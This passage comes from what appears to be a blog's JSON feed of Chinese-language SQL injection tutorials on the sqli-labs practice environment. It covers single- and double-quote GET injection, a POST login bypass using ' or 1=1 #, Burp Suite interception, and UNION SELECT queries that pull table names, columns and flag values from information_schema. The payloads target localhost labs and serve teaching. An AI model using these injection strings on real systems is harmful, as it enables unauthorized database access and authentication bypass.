sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(table_name), database() from information_schema.tables where table_schema = database() --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929221156300.png\" alt=\"image-20220929221156300\"></p>\n<h2 id=\"注入步骤双引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤双引号注入\">#</a> 注入步骤 (双引号注入)</h2>\n<p>Less-4 是一道双引号注入的题目。</p>\n<p><img src=\"image-20220929221450837.png\" alt=\"image-20220929221450837\"></p>\n<p>由于查看发现是 GET 请求，因此礼节性地输入 id=1</p>\n<p><img src=\"image-20220929221657747.png\" alt=\"image-20220929221657747\"></p>\n<h3 id=\"尝试注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型-2\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929221831821.png\" alt=\"image-20220929221831821\"></p>\n<p>不报错，怀疑存在双引号注入。</p>\n<p>输入 1“  来看看是否报错</p>\n<p><img src=\"image-20220929221918225.png\" alt=\"image-20220929221918225\"></p>\n<p>那么， <code>&quot;1&quot;&quot;) LIMIT 0,1</code>  中，“1&quot;”)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型-2\">#</a> 确定注入类型</h3>\n<p>我们尝试：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-4</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;) --+</span><br></pre></td></tr></table></figure>\n<p>成功不报错。</p>\n<p><img src=\"image-20220929222215596.png\" alt=\"image-20220929222215596\"></p>\n<p>之后就可以愉快地<strong>确定列数</strong> + 使用<strong>联合查询泄露数据库信息</strong>了。</p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>通过闭合，确定单引号注入</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定列数为3</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span> <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; order by 4 --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">sql查询失败</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.联合查询泄露数据库信息</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>database() <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: emails,flag,users</span><br><span class=\"line\">Password: challenge</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&#x27;</span>flag<span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: flag,value</span></span><br><span class=\"line\"><span class=\"string\">Password: challenge</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.获取flag</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, flag, <span class=\"keyword\">value</span>)), database() <span class=\"keyword\">from</span> challenge.flag <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:<span class=\"keyword\">any</span>,flag8:sqlc,flag9:tasi,flag10:moo,flag12:<span class=\"literal\">false</span>,flag11:muse</span><br><span class=\"line\">Password: challenge</span><br></pre></td></tr></table></figure>\n<p>至此，字符型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "title": "POST注入",
            "date_published": "2022-09-29T13:49:22.000Z",
            "content_html": "<h1 id=\"sql-注入之post注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之post注入\">#</a> SQL 注入之 POST 注入</h1>\n<p>本篇使用 POST 注入。</p>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929203645441.png\" alt=\"image-20220929203645441\"></p>\n<p>果不其然，此输入框存在 SQL 注入。且报错信息为 <code>use near ''1'' and password='' LIMIT 0,1' at line 1</code></p>\n<p>提取出错点发生在这一句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;1&#x27;&#x27; and password=&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>接着，查看其 F12 发现，网页发送的是 POST 请求。</p>\n<p><img src=\"image-20220929204011334.png\" alt=\"image-20220929204011334\"></p>\n<p>然后通过继续深入查询网页源代码的 Elements 可以得到，两个 <code>&lt;input&gt;</code>  标签对应的变量名，<strong>Username</strong> 对应<strong> uname</strong>，<strong>Password</strong> 对应<strong> passwd</strong></p>\n<p><img src=\"image-20220929204648604.png\" alt=\"image-20220929204648604\"></p>\n<p>那么就可以构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929204929486.png\" alt=\"image-20220929204929486\"></p>\n<p>那么，基本上可以确定，此题存在 SQL 注入之一 ——POST 注入。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>输入 1’ # 查看是否依旧报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>不报错，说明是 POST 单引号注入。</p>\n<p><img src=\"image-20220929205132216.png\" alt=\"image-20220929205132216\"></p>\n<h3 id=\"是否可以构造非法查询\"><a class=\"markdownIt-Anchor\" href=\"#是否可以构造非法查询\">#</a> 是否可以构造非法查询</h3>\n<p>由于</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>username 是用单引号括起来的，为了让语法不出错，我们需要<strong>保留单引号</strong>。即，可以在 <code>uname=1' #&amp;passwd=1</code>  的 <code>' #</code> 之间<strong>插入我们想要的非法查询语句</strong>。</p>\n<p>因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span> #<span class=\"string\">&#x27; and password = &#x27;</span>xxx<span class=\"string\">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>登录成功:</p>\n<p><img src=\"image-20220929205718001.png\" alt=\"image-20220929205718001\"></p>\n<h2 id=\"使用burpsuit来做post注入\"><a class=\"markdownIt-Anchor\" href=\"#使用burpsuit来做post注入\">#</a> 使用 BurpSuit 来做 Post 注入</h2>\n<p>这里也稍微提及一下 BurpSuit 抓包工具的简单使用：</p>\n<h3 id=\"firefox浏览器配置\"><a class=\"markdownIt-Anchor\" href=\"#firefox浏览器配置\">#</a> FireFox 浏览器配置</h3>\n<p>FireFox 浏览器中，在” 工具栏 — 选项 — 高级 — 连接设置 “中，配置手动代理和端口号 (127.0.0.1 : <strong>9090</strong>)</p>\n<p><img src=\"image-20220929210357211.png\" alt=\"image-20220929210357211\"></p>\n<h3 id=\"burpsuit配置\"><a class=\"markdownIt-Anchor\" href=\"#burpsuit配置\">#</a> BurpSuit 配置</h3>\n<p>到 BurpSuit 里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : <strong>9090</strong>）</p>\n<p><img src=\"image-20220929210527792.png\" alt=\"image-20220929210527792\"></p>\n<h3 id=\"令burpsuit拦截到包\"><a class=\"markdownIt-Anchor\" href=\"#令burpsuit拦截到包\">#</a> 令 BurpSuit 拦截到包</h3>\n<p>点击 FireFox 的任意提交请求的按钮就可以令 BurpSuit 拦截到包。以 FireFox 为例就是，点击了这道题目中的 <code>Submit按钮</code>  或 使用 Hackbar 的 <code>Execute按钮</code> 。</p>\n<p><img src=\"image-20220929210640596.png\" alt=\"image-20220929210640596\"></p>\n<p>④在内容中鼠标右键点击后选择 Send to Reapeater</p>\n<p><img src=\"image-20220929210828967.png\" alt=\"image-20220929210828967\"></p>\n<p>⑤在 Reapter 中多次尝试修改注入内容来查看返回的包</p>\n<p>第一次注入尝试</p>\n<p><img src=\"image-20220929211038588.png\" alt=\"image-20220929211038588\"></p>\n<p>第二次注入尝试</p>\n<p><img src=\"image-20220929210956005.png\" alt=\"image-20220929210956005\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "整型注入",
            "date_published": "2022-09-28T16:27:56.000Z",
            "content_html": "<h1 id=\"sql注入之整型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之整型注入\">#</a> SQL 注入之整型注入</h1>\n<p>本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。</p>\n<h2 id=\"环境准备\"><a class=\"markdownIt-Anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<p>当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮</p>\n<p><img src=\"image-20220928202842147.png\" alt=\"image-20220928202842147\"></p>\n<p>之后点击 MySQL 管理器</p>\n<p><img src=\"image-20220928203059624.png\" alt=\"image-20220928203059624\"></p>\n<p>双击 localhost，账户名 root，密码 root 即可进入。</p>\n<p><img src=\"image-20220928203206981.png\" alt=\"image-20220928203206981\"></p>\n<p>打开浏览器，选择 sqli</p>\n<p><img src=\"image-20220928203903223.png\" alt=\"image-20220928203903223\"></p>\n<p>选择第一个 Setup</p>\n<p><img src=\"image-20220928203930840.png\" alt=\"image-20220928203930840\"></p>\n<p>出现这个界面，即完成了数据库的初始化</p>\n<p><img src=\"image-20220928203950837.png\" alt=\"image-20220928203950837\"></p>\n<p>点击后退键回到上一个页面，然后点击 Less-1</p>\n<p><img src=\"image-20220928204115026.png\" alt=\"image-20220928204115026\"></p>\n<p>出现 SQLI DUMB SERIES-1</p>\n<p><img src=\"image-20220928204123886.png\" alt=\"image-20220928204123886\"></p>\n<p>接下来以 Less-2 作为例子进行讲解：</p>\n<p><img src=\"image-20220928210728567.png\" alt=\"image-20220928210728567\"></p>\n<h2 id=\"sql注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#sql注入步骤\">#</a> SQL 注入步骤</h2>\n<h3 id=\"1判断是否有注入判断是否未严格校验\"><a class=\"markdownIt-Anchor\" href=\"#1判断是否有注入判断是否未严格校验\">#</a> ①判断是否有注入 (判断是否未严格校验)</h3>\n<h4 id=\"1可控参数的改变能否影响页面的显示结果\"><a class=\"markdownIt-Anchor\" href=\"#1可控参数的改变能否影响页面的显示结果\">#</a> 1) 可控参数的改变能否影响页面的显示结果</h4>\n<p>网页让输入 id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。</p>\n<p>点击查看网页源代码，在 Network 这里看到是 GET 请求。</p>\n<p><img src=\"image-20220928213756712.png\" alt=\"image-20220928213756712\"></p>\n<p>因此我们选择在链接后面加上 id 参数</p>\n<p><img src=\"image-20220928213510534.png\" alt=\"image-20220928213510534\"></p>\n<p>发现成功令其输出内容。</p>\n<p>此时我们再次改变 GET 请求中 id 的值，发现，内容会对应有所变化。</p>\n<p><img src=\"image-20220928214022889.png\" alt=\"image-20220928214022889\"></p>\n<h4 id=\"2输入的sql语句是否能报错\"><a class=\"markdownIt-Anchor\" href=\"#2输入的sql语句是否能报错\">#</a> 2) 输入的 SQL 语句是否能报错</h4>\n<p>因为能通过数据库的报错，看到数据库的一些语句痕迹</p>\n<p>我们假设它后台的查询语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> $id</span><br></pre></td></tr></table></figure>\n<p>猜想：能否通过加单引号令其出错？</p>\n<p>因为：</p>\n<p>如果是整型注入漏洞，则像 3’这样的字符传入 $id 处会引发错误。</p>\n<p>如果是单引号注入漏洞，像 3’这样的字符传入 $id 处也会引发错误。</p>\n<p><img src=\"image-20220928214501924.png\" alt=\"image-20220928214501924\"></p>\n<p>黄字部分的报错语句，非常之重要！</p>\n<p>near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第 1 行的 xxxxxxx 语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是 “输出了单引号后面的语句”——LIMIT 0,1。</p>\n<p>为了再次确定 near ‘xxxxxxxxxx’ at line 1 中在 LIMIT 0,1 之前的一个单引号是我们输入的单引号，我们再次改变 GET 请求中 &quot;’ '&quot;（单引号）变为 &quot;&quot;&quot;（双引号）</p>\n<p><img src=\"image-20220928215359897.png\" alt=\"image-20220928215359897\"></p>\n<p>发现成功令报错信息中 near 'xxxxx’中的 LIMIT 前一个符号发生改变。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，加入单引号会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; limit 0,1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#如果是单引号注入，加入单引号也会报错</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27;&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>据目前输入的结果来看，此网页存在 “整型注入” 或者 “单引号注入”</p>\n<h4 id=\"3输入的sql语句能否不报错\"><a class=\"markdownIt-Anchor\" href=\"#3输入的sql语句能否不报错\">#</a> 3) 输入的 SQL 语句能否不报错</h4>\n<p>为了查看我们的语句能够成功闭合</p>\n<p>那怎么区分到底是整型还是单引号呢？</p>\n<p>使用 # 来注释后面语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#加入#号后，两个语法依旧错误，故都会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; # limit 0,1</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27; #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>结果确实是报错。</p>\n<p><img src=\"image-20220928220327744.png\" alt=\"image-20220928220327744\"></p>\n<p>接下来我们删掉单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，则删掉单引号，保留#号后，不会报错！</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> # limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"string\">&#x27;2 #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928220529170.png\" alt=\"image-20220928220529170\"></p>\n<h3 id=\"2什么类型的注入\"><a class=\"markdownIt-Anchor\" href=\"#2什么类型的注入\">#</a> ②什么类型的注入</h3>\n<p>因此，此处经过上述报错信息确定，存在<strong>整型注入</strong>！</p>\n<h3 id=\"3语句是否能够被恶意修改\"><a class=\"markdownIt-Anchor\" href=\"#3语句是否能够被恶意修改\">#</a> ③语句是否能够被恶意修改</h3>\n<p>恶意修改主要指能否再加入一些我们想要的判断条件，比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span># limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>如果是整型注入无误，这里条件为 “id = 2 and 0”—— 这是永假条件，则不会有任何查询结果。</p>\n<p><img src=\"image-20220928221547372.png\" alt=\"image-20220928221547372\"></p>\n<p>结果正如我们所料，空空如也。</p>\n<h3 id=\"4是否能够成功执行\"><a class=\"markdownIt-Anchor\" href=\"#4是否能够成功执行\">#</a> ④是否能够成功执行</h3>\n<p>第三个能满足，其实第四个就顺带就 OK。</p>\n<h3 id=\"5获取我们想要的数据\"><a class=\"markdownIt-Anchor\" href=\"#5获取我们想要的数据\">#</a> ⑤获取我们想要的数据</h3>\n<p>关键数据是保存在数据库里面的，关系如下：</p>\n<p>数据库 -&gt; 表 -&gt; 字段 -&gt; 值</p>\n<p>打开 MySQL，我们可以看到其中有 information_schema 库（这是 MySQL 自带的库，管理所有表信息）</p>\n<p><img src=\"image-20220928223622076.png\" alt=\"image-20220928223622076\"></p>\n<p>这个库中有三个表非常值得我们关注：</p>\n<p>Schemata 表（包含所有的 <code>库名信息</code> ）、Tables 表（包含所有的 <code>表名信息</code> ）、Columns 表（包含所有的 <code>列名信息</code> ）</p>\n<p><strong>首先是 Schemeta 表</strong>， <code>schema_name</code>  对应着所有数据库的名字。</p>\n<p><img src=\"image-20220928224006640.png\" alt=\"image-20220928224006640\"></p>\n<p><strong>其次是 Tables 表</strong>， <code>table_name</code>  这个列里，存储了 <code>table_schema对应的库</code> 下面的所有表</p>\n<p><img src=\"image-20220928224135720.png\" alt=\"image-20220928224135720\"></p>\n<p><strong>最后是 Columns 表</strong>，通过 <code>table_schema</code>  对应的库， <code>table_name</code>  对应的表，<strong>使用 column_name 对应的列名，来唯一地定位某个列</strong>。</p>\n<p><img src=\"image-20220928224405698.png\" alt=\"image-20220928224405698\"></p>\n<h4 id=\"1构造联合查询\"><a class=\"markdownIt-Anchor\" href=\"#1构造联合查询\">#</a> 1）构造联合查询</h4>\n<p>确定的整型注入中，我们需要构造出我们想要的查询内容，比如在<strong> information_schema 库</strong>的<strong> Schema 表</strong>中获取 <code>schema_name</code> ：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225341595.png\" alt=\"image-20220928225341595\"></p>\n<p>但如果像上面这样构造，会报错，我们需要使用到联合查询。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225106827.png\" alt=\"image-20220928225106827\"></p>\n<p>但是，如果像上面这样构造，依旧会报错，在 SQL 查询中，union 前后的两个列 ++<strong> 需要列数完全一致才可拼接</strong> ++。</p>\n<p>因此，需要使用占位符来定位前面的查询是多少列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#占位一个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span> #</span><br><span class=\"line\">#占位两个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span> #</span><br><span class=\"line\">#占位三个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> #</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n<p>注意，这里的 1,2,3 可以填任何数字或者符号，仅仅为了占位使用，<strong>可以被任意 “想要看到的输出内容” 覆盖</strong>。</p>\n<p>经过多次定位，我们最终得到：<strong>前面的查询</strong>使用到的是<strong> 3 个列</strong>。</p>\n<p><img src=\"image-20220928225313035.png\" alt=\"image-20220928225313035\"></p>\n<p>因此有：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225608030.png\" alt=\"image-20220928225608030\"></p>\n<p>虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用 union 查询，<strong>还有个 bug</strong> 就是如果前面的查询有效，<strong>最终结果会在前面查询到的结尾后面拼接</strong>。</p>\n<p>为了让后面查询到的内容（我们 <code>想要看到的数据</code> ）提前，<strong>我们需要令前面的查询失效</strong>，简单的方法就是令 id = 39888 这样平常不会使用的奇怪数字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225926603.png\" alt=\"image-20220928225926603\"></p>\n<h4 id=\"2拼接多组内容在同一行输出-寻找所在库\"><a class=\"markdownIt-Anchor\" href=\"#2拼接多组内容在同一行输出-寻找所在库\">#</a> 